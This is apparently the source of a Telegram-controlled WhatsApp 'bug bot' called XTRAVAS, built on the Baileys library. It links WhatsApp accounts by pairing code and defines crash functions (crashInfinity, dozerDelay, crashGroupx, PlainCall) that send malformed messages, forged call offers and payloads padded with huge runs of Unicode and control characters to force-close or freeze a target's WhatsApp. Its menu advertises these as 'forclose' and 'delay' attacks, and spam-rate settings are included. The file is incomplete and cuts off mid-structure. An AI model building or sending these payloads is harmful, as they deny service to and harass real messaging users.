const {
    makeWASocket,
    useMultiFileAuthState,
    makeCacheableSignalKeyStore,
    delay,
    downloadMediaMessage,
    extractMessageContent,
    getAggregateVotesInPollMessage,
    generateForwardMessageContent,
    generateMessageID,
    fetchLatestWaWebVersion,
    sockConnect,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    WA_MESSAGES_STUB_TYPE,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
    encodeNewsletterMessage,
    patchMessageBeforeSending,
    encodeWAMessage,
    encodeSignedDeviceIdentity,
    jidEncode,
    jidDecode,
    baileysLib,
    S_WHATSAPP_NET,
    OFFICIAL_BIZ_JID
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const path = require('path');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const { BOT_TOKEN, R7XOWERID } = require("./settings.js");
const crypto = require('crypto');
const memek_ibulu = 10;//ANGKA SPAM MAKIN GEDE MAKIN CEPET SPAM NYA
const delay_kont = 5;//DELAY SPAM MAKIN GEDE ANGKA NYA MAKIN LAMBAT DELAY NYA
const bot = new Telegraf(BOT_TOKEN);
const images = [
"https://files.catbox.moe/3n3bj9.jpg",
];
  return images[Math.floor(Math.random() * images.length)];
}


function startBot() {
  console.log(chalk.red(`
⢻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⠤⠤⠴⢶⣶⡶⠶⠤⠤⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠁
⠀ ⠻⣯⡗⢶⣶⣶⣶⣶⢶⣤⣄⣀⣀⡤⠒⠋⠁⠀⠀⠀⠀⠚⢯⠟⠂⠀⠀⠀⠀⠉⠙⠲⣤⣠⡴⠖⣲⣶⡶⣶⣿⡟⢩⡴⠃⠀
 ⠀⠀⠈⠻⠾⣿⣿⣬⣿⣾⡏⢹⣏⠉⠢⣄⣀⣀⠤⠔⠒⠊⠉⠉⠉⠉⠑⠒⠀⠤⣀⡠⠚⠉⣹⣧⣝⣿⣿⣷⠿⠿⠛⠉⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⣹⠟⠛⠿⣿⣤⡀⣸⠿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠾⣇⢰⣶⣿⠟⠋⠉⠳⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡞⠁⠀⠀⡠⢾⣿⣿⣯⠀⠈⢧⡀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⢀⣿⣿⣯⢼⠓⢄⠀⢀⡘⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣰⣟⣟⣿⣀⠎⠀⠀⢳⠘⣿⣷⡀⢸⣿⣶⣤⣄⣀⣤⢤⣶⣿⡇⢀⣾⣿⠋⢀⡎⠀⠀⠱⣤⢿⠿⢷⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣰⠋⠀⠘⣡⠃⠀⠀⠀⠈⢇⢹⣿⣿⡾⣿⣻⣖⠛⠉⠁⣠⠏⣿⡿⣿⣿⡏⠀⡼⠀⠀⠀⠀⠘⢆⠀⠀⢹⡄⠀⠀⠀
⠀⠀⠀⢰⠇⠀⠀⣰⠃⠀⠀⣀⣀⣀⣼⢿⣿⡏⡰⠋⠉⢻⠳⣤⠞⡟⠀⠈⢣⡘⣿⡿⠶⡧⠤⠄⣀⣀⠀⠈⢆⠀⠀⢳⠀⠀⠀
⠀⠀⠀⡟⠀⠀⢠⣧⣴⣊⣩⢔⣠⠞⢁⣾⡿⢹⣷⠋⠀⣸⡞⠉⢹⣧⡀⠐⢃⢡⢹⣿⣆⠈⠢⣔⣦⣬⣽⣶⣼⣄⠀⠈⣇⠀⠀
⠀⠀⢸⠃⠀⠘⡿⢿⣿⣿⣿⣛⣳⣶⣿⡟⣵⠸⣿⢠⡾⠥⢿⡤⣼⠶⠿⡶⢺⡟⣸⢹⣿⣿⣾⣯⢭⣽⣿⠿⠛⠏⠀⠀⢹⠀⠀
⠀⠀⢸⠀⠀⠀⡇⠀⠈⠙⠻⠿⣿⣿⣿⣇⣸⣧⣿⣦⡀⠀⣘⣷⠇⠀⠄⣠⣾⣿⣯⣜⣿⣿⡿⠿⠛⠉⠀⠀⠀⢸⠀⠀⢸⡆⠀
⠀⠀⢸⠀⠀⠀⡇⠀⠀⠀⠀⣀⠼⠋⢹⣿⣿⣿⡿⣿⣿⣧⡴⠛⠀⢴⣿⢿⡟⣿⣿⣿⣿⠀⠙⠲⢤⡀⠀⠀⠀⢸⡀⠀⢸⡇⠀
⠀⠀⢸⣀⣷⣾⣇⠀⣠⠴⠋⠁⠀⠀⣿⣿⡛⣿⡇⢻⡿⢟⠁⠀⠀⢸⠿⣼⡃⣿⣿⣿⡿⣇⣀⣀⣀⣉⣓⣦⣀⣸⣿⣿⣼⠁⠀
⠀⠀⠸⡏⠙⠁⢹⠋⠉⠉⠉⠉⠉⠙⢿⣿⣅⠀⢿⡿⠦⠀⠁⠀⢰⡃⠰⠺⣿⠏⢀⣽⣿⡟⠉⠉⠉⠀⠈⠁⢈⡇⠈⠇⣼⠀⠀
⠀⠀⠀⢳⠀⠀⠀⢧⠀⠀⠀⠀⠀⠀⠈⢿⣿⣷⣌⠧⡀⢲⠄⠀⠀⢴⠃⢠⢋⣴⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⡸⠀⠀⢠⠇⠀⠀
⠀⠀⠀⠈⢧⠀⠀⠈⢦⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣧⠐⠸⡄⢠⠀⢸⠀⢠⣿⣟⡿⠋⠀⠀⠀⠀⠀⠀⠀⡰⠁⠀⢀⡟⠀⠀⠀
⠀⠀⠀⠀⠈⢧⠀⠀⠀⠣⡀⠀⠀⠀⠀⠀⠀⠈⠛⢿⡇⢰⠁⠸⠄⢸⠀⣾⠟⠉⠀⠀⠀⠀⠀⠀⠀⢀⠜⠁⠀⢀⡞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⢧⡀⠀⠀⠙⢄⠀⠀⠀⠀⠀⠀⠀⢨⡷⣜⠀⠀⠀⠘⣆⢻⠀⠀⠀⠀⠀⠀⠀⠀⡴⠋⠀⠀⣠⠎⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⠀⠀⠑⠦⣀⠀⠀⠀⠀⠈⣷⣿⣦⣤⣤⣾⣿⢾⠀⠀⠀⠀⠀⣀⠴⠋⠀⠀⢀⡴⠃⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢄⡀⢸⣶⣿⡑⠂⠤⣀⡀⠱⣉⠻⣏⣹⠛⣡⠏⢀⣀⠤⠔⢺⡧⣆⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⢽⡁⠀⠀⠀⠀⠈⠉⠙⣿⠿⢿⢿⠍⠉⠀⠀⠀⠀⠉⣻⡯⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠲⠤⣀⣀⡀⠀⠈⣽⡟⣼⠀⣀⣀⣠⠤⠒⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⢻⡏⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈
`));
}

let sock;
function saveActiveSessions(botjid) {
        try {
        const sessions = [];
        if (fs.existsSync(SESSIONS_FILE)) {
        const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        if (!existing.includes(botjid)) {
        sessions.push(...existing, botjid);
        }
        } else {
        sessions.push(botjid);
        }
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
        } catch (error) {
        console.error("Error saving session:", error);
        }
        }

async function initializeWhatsAppConnections() {
          try {
                   if (fs.existsSync(SESSIONS_FILE)) {
                  const activejids = JSON.parse(fs.readFileSync(SESSIONS_FILE));
                  console.log(`Ditemukan ${activejids.length} sesi WhatsApp aktif`);

                  for (const botjid of activejids) {
                  console.log(`Mencoba menghubungkan WhatsApp: ${botjid}`);
                  const sessionDir = createSessionDir(botjid);
                  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

                  sock = makeWASocket ({
                  auth: state,
                  printQRInTerminal: true,
                  logger: P({ level: "silent" }),
                  defaultQueryTimeoutMs: undefined,
                  });

                  await new Promise((resolve, reject) => {
                  sock.ev.on("connection.update", async (update) => {
                  const { connection, lastDisconnect } = update;
                  if (connection === "open") {
                  console.log(`Bot ${botjid} terhubung!`);
                  sessions.set(botjid, sock);
                  resolve();
                  } else if (connection === "close") {
                  const shouldReconnect =
                  lastDisconnect?.error?.output?.statusCode !==
                  DisconnectReason.loggedOut;
                  if (shouldReconnect) {
                  console.log(`Mencoba menghubungkan ulang bot ${botjid}...`);
                  await initializeWhatsAppConnections();
                  } else {
                  reject(new Error("Koneksi ditutup"));
                  }
                  }
                  });

                  sock.ev.on("creds.update", saveCreds);
                  });
                  }
                }
             } catch (error) {
          console.error("Error initializing WhatsApp connections:", error);
           }
         }

function createSessionDir(botjid) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botjid}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}
////=== Intalasi WhatsApp ===\\\
async function connectToWhatsApp(botjid, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
<blockquote>🧪𝐗𝐓𝐑𝐀𝐕𝐀𝐒</blockquote>
▢ Prepare the pairing code...
╰➤ jid : ${botjid}
`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botjid);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
<blockquote>🧪𝐗𝐓𝐑𝐀𝐕𝐀𝐒</blockquote>
▢ Prosess connecting
╰➤ jid : ${botjid}
╰➤ Status : Connecting...
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await connectToWhatsApp(botjid, chatId);
      } else {
        await bot.editMessageText(
          `
<blockquote>🧪𝐗𝐓𝐑𝐀𝐕𝐀𝐒</blockquote>
▢ Connection closed.
╰➤ jid : ${botjid}
╰➤ Status : Failed ❌
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botjid, sock);
      saveActiveSessions(botjid);
      await bot.editMessageText(
        `
<blockquote>🧪𝐗𝐓𝐑𝐀𝐕𝐀𝐒</blockquote>
▢ Connection Success!
╰➤ jid : ${botjid}
╰➤ Status : Success Connected
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
  const code = await sock.requestPairingCode(botjid, "R7XFREEE");
  const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

  await bot.editMessageText(
    `
<blockquote>🧪𝐗𝐓𝐑𝐀𝐕𝐀𝐒</blockquote>
▢ Your Code Pairing..
╰➤ jid : ${botjid}
╰➤ Code : ${formattedCode}
`,
    {
      chat_id: chatId,
      message_id: statusMessage,
      parse_mode: "HTML",
  });
};
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
<blockquote>🧪𝐗𝐓𝐑𝐀𝐕𝐀𝐒</blockquote>
▢ Try again...
╰➤ jid : ${botjid}
╰➤ Status : ${error.message} Error⚠️
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

const expirationDate = '2026-01-30T16:59:59Z';

async function checkAccess() {
  try {
    const now = Date.now();
    const expiredAt = new Date(expirationDate).getTime();

    if (now > expiredAt) {
      console.error(
        '❌ Akses ditolak: Batas waktu habis \nHubungi t.me/xrelly untuk memperbarui.'
      );
      process.exit(1);
    }
  } catch (err) {
    console.error('⚠️ Kesalahan saat memeriksa akses:', err);
    process.exit(3);
  }
}


function formatRuntime(seconds) {
        const days = Math.floor(seconds / (3600 * 24));
        const hours = Math.floor((seconds % (3600 * 24)) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = seconds % 60;  
        return `${hours}h, ${minutes}m, ${secs}s`;
        }

       const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
        const now = Math.floor(Date.now() / 1000);
        return formatRuntime(now - startTime);
        }

function getSpeed() {
        const startTime = process.hrtime();
        return getBotSpeed(startTime); 
}


function getCurrentDate() {
        const now = new Date();
        const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
         return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

        let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
        fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
        if (cooldownData.users[userId]) {
                const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
                if (remainingTime > 0) {
                        return Math.ceil(remainingTime / 1000); 
                }
        }
        cooldownData.users[userId] = Date.now();
        saveCooldown();
        setTimeout(() => {
                delete cooldownData.users[userId];
                saveCooldown();
        }, cooldownData.time);
        return 0;
}

function setCooldown(timeString) {
        const match = timeString.match(/(\d+)([smh])/);
        if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

        let [_, value, unit] = match;
        value = parseInt(value);

        if (unit === "s") cooldownData.time = value * 1000;
        else if (unit === "m") cooldownData.time = value * 60 * 1000;
        else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

        saveCooldown();
        return `Cooldown diatur ke ${value}${unit}`;
}

const bugRequests = {};

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const img = getRandomImage();
  const caption = `
━━━━━━━━━━━━━━━━━━
□ X T R A V A S
□ Creator: Alywasr7x.t.me
□ Version: V1.1
□ Type: JavaScript 
□ Information: r7xnight.t.me

□ /Xtravas
└─ > Forclose 1msg
└─ > Forclose invisible
└─ > Delay hard x invisible
└─ > Combo forclose invisible and delay
`;

  await bot.sendPhoto(chatId, img, {
  caption,
  parse_mode: "HTML"
});

//=============================================//

async function crashInfinity(jid) {
  await sock.relayMessage(jid, {
    sendPaymentMessage: {
      noteMessage: null,
      requestMessageKey: undefined,
      background: null,
      contextInfo: {
        externalAdReply: null
      }
    }
  }, {
    participant: { jid: jid },
    quoted: null
  });
}

async function dozerDelay(usuario) {
  let msg = generateWAMessageFromContent(
    usuario,
    {
      ephermeralMessage: {
        message: {
          requestPhonejidMessage: {
            contextInfo: {
              quotedMessage: {
                contactMessage: {
                  displayName: "🩸" + "𑇂𑆵𑆴𑆿".repeat(10000),
                  vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🩸${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🩸${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:🩸${"ᩫᩫ".repeat(4000)}\nORG:🩸${"ᩫᩫ".repeat(4000)}\nTITLE:🩸${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🩸${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🩸${"ᩫᩫ".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:🩸${"ᩫᩫ".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;🩸${"ᩫᩫ".repeat(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:🩸${"ᩫᩫ".repeat(4000)}\nPHOTO;BASE64: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\nX-WA-BIZ-NAME:🩸${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
                  contextInfo: {
                    externalAdReply: {
                      automatedGreetingMessageShown: true,
                      automatedGreetingMessageCtaType: "\u0000".repeat(100000),
                      greetingMessageBody: "\u0000",
                    },
                  },
                },
              },
            },
          },
        },
      },
    },
    {},
  );

  let JsonExp = generateWAMessageFromContent(
    usuario,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: " Kkkk ",
              mentionedJid: ["13135559098@s.whatsapp.net"],
            },
            body: {
              text: "@xrelly • #fvcker 🩸",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_jid":"507","city":"Batavia","name":"dvx","phone_jid":"+13135550202","house_jid":"7205826","floor_jid":"16","state":"${"\x10".repeat(1000000)}"}}`,
              version: 3,
            },
          },
        },
      },
    },
    {
      participant: { jid: usuario },
    },
  );

  await sock.relayMessage(
    usuario,
    {
      groupStatusMessageV2: {
        message: JsonExp.message,
      },
    },
    xrl
      ? { messageId: JsonExp.key.id, participant: { jid: usuario } }
      : { messageId: JsonExp.key.id },
  );

  await sock.relayMessage(
    usuario,
    {
      groupStatusMessageV2: {
        message: msg.message,
      },
    },
    xrl
      ? { messageId: msg.key.id, participant: { jid: usuario } }
      : { messageId: msg.key.id },
  );
}


async function crashGroupx(target) {

const options = [
    { optionName: "fvck" },
    { optionName: "fvcker" },
    { optionName: "fvcked" }
];

const correctAnswer = options[1];

const msg = generateWAMessageFromContent(target, {
    botInvokeMessage: {
        message: {
            messageContextInfo: {
                messageSecret: crypto.randomBytes(32), 
                messageAssociation: {
                    associationType: 7,
                    parentMessageKey: crypto.randomBytes(16)
                }
            }, 
            pollCreationMessage: {
                name: "xrelly #1st", 
                options: options,
                selectableOptionsCount: 1,
                pollType: "QUIZ",
                correctAnswer: correctAnswer
            }
        }
    }
}, {});

await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id
});
}

async function PlainCall(jid) {
    try {
      const jid = String(jid).includes("@s.whatsapp.net")
            ? String(jid)
            : `${String(jid).replace(/\D/g, "")}@s.whatsapp.net`;

        const mutexMemek = () => {
            let map = {};
            return {
                mutex(key, fn) {
                    map[key] ??= { task: Promise.resolve() };
                    map[key].task = (async (prev) => {
                        try { await prev; } catch {}
                        return fn();
                    })(map[key].task);
                    return map[key].task;
                }
            };
        };

        const MamakLoJing = mutexMemek();
        const xrellyBuffer = (buf) =>
            Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
        const yntkts = encodeSignedDeviceIdentity;

        sock.createParticipantNodes = async (
            recipientJids,
            message,
            extraAttrs,
            dsmMessage
        ) => {
            if (!recipientJids.length)
                return { nodes: [], shouldIncludeDeviceIdentity: false };

            const patched =
                (await sock.patchMessageBeforeSending?.(
                    message,
                    recipientJids
                )) ?? message;

            const ywdh = Array.isArray(patched)
                ? patched
                : recipientJids.map((j) => ({
                      recipientJid: j,
                      message: patched
                  }));

            const { id: meId, lid: meLid } = sock.authState.creds.me;
            const jembut = meLid ? jidDecode(meLid)?.user : null;

            let shouldIncludeDeviceIdentity = false;

            const nodes = await Promise.all(
                ywdh.map(async ({ recipientJid: j, message: msg }) => {
                    const { user: jidUser } = jidDecode(j);
                    const { user: ownUser } = jidDecode(meId);

                    const isOwn =
                        jidUser === ownUser || jidUser === jembut;

                    const y = j === meId || j === meLid;
                    if (dsmMessage && isOwn && !y) msg = dsmMessage;

                    const bytes = xrellyBuffer(
                        yntkts ? yntkts(msg) : Buffer.from([])
                    );

                    return MamakLoJing.mutex(j, async () => {
                        const { type, ciphertext } =
                            await sock.signalRepository.encryptMessage({
                                jid: j,
                                data: bytes
                            });

                        if (type === "pkmsg")
                            shouldIncludeDeviceIdentity = true;

                        return {
                            tag: "to",
                            attrs: { jid: j },
                            content: [
                                {
                                    tag: "enc",
                                    attrs: { v: "2", type, ...extraAttrs },
                                    content: ciphertext
                                }
                            ]
                        };
                    });
                })
            );

            return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
        };

        let devices = [];

        try {
            devices = (
                await sock.getUSyncDevices([jid], false, false)
            ).map(
                ({ user, device }) =>
                    `${user}${device ? ":" + device : ""}@s.whatsapp.net`
            );
        } catch {
            devices = [jid];
        }

        try {
            await sock.assertSessions(devices);
        } catch {}

        let { nodes: destinations, shouldIncludeDeviceIdentity } = {
            nodes: [],
            shouldIncludeDeviceIdentity: false
        };

        try {
            const created = await sock.createParticipantNodes(
                devices,
                { conversation: "y" },
                { count: "0" }
            );

            destinations = created?.nodes ?? [];
            shouldIncludeDeviceIdentity = !!created?.shouldIncludeDeviceIdentity;
        } catch {
            destinations = [];
            shouldIncludeDeviceIdentity = false;
        }

        const wtfXrL = {
            tag: "call",
            attrs: {
                to: jid,
                id:
                    sock.generateMessageTag?.() ??
                    crypto.randomBytes(8).toString("hex"),
                from:
                    sock.user?.id || sock.authState?.creds?.me?.id
            },
            content: [
                {
                    tag: "offer",
                    attrs: {
                        "call-id": crypto
                            .randomBytes(16)
                            .toString("hex")
                            .slice(0, 64)
                            .toUpperCase(),
                        "call-creator":
                            sock.user?.id || sock.authState?.creds?.me?.id
                    },
                    content: [
                        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                        {
                            tag: "video",
                            attrs: {
                                orientation: "0",
                                screen_width: "1920",
                                screen_height: "1080",
                                device_orientation: "0",
                                enc: "vp8",
                                dec: "vp8"
                            }
                        },
                        { tag: "net", attrs: { medium: "3" } },
                        {
                            tag: "capability",
                            attrs: { ver: "1" },
                            content: new Uint8Array([
                                1, 5, 247, 9, 228, 250, 1
                            ])
                        },
                        { tag: "encopt", attrs: { keygen: "2" } },
                        {
                            tag: "destination",
                            attrs: {},
